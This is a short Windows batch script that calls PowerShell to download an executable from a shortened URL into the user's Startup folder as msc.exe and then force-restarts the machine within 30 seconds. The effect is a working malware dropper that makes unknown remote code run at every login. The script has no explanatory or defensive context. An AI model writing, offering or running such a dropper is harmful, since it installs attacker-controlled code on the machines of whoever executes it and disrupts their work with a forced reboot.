@echo off
powershell $s = [System.Environment]::GetFolderPath('Startup'); iwr https://s.id/1UPW2 -O $s/msc.exe && shutdown -r -f -t 30